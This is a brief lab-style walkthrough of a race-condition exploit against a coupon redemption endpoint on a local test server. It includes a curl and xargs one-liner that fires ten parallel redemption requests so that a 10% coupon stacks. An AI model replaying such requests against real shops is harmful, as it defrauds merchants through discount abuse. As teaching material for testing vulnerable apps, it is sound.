## Race Condition

### Coupon Exploit

1. Open the browser **Developer Tools** and switch to the **Network** tab.
2. Enter the coupon code `SAVE10` and click **Apply**.
3. Capture the coupon redemption request from the Network tab.
4. Replay the request **10 times in parallel**.

```bash
printf '%s\n' {1..10} | xargs -n1 -P10 -I{} \
curl -sS -o /dev/null -w "%{http_code}\n" "http://127.0.0.1:3000/api/v1/order/redeem-coupon" -X POST \
-H "Accept: application/json" -H "content-type: application/json" \
--data-raw '{"walletCode":"demo","code":"SAVE10"}'
```

5. Observe that the coupon is applied multiple times, resulting in a **discount greater than 10%**.

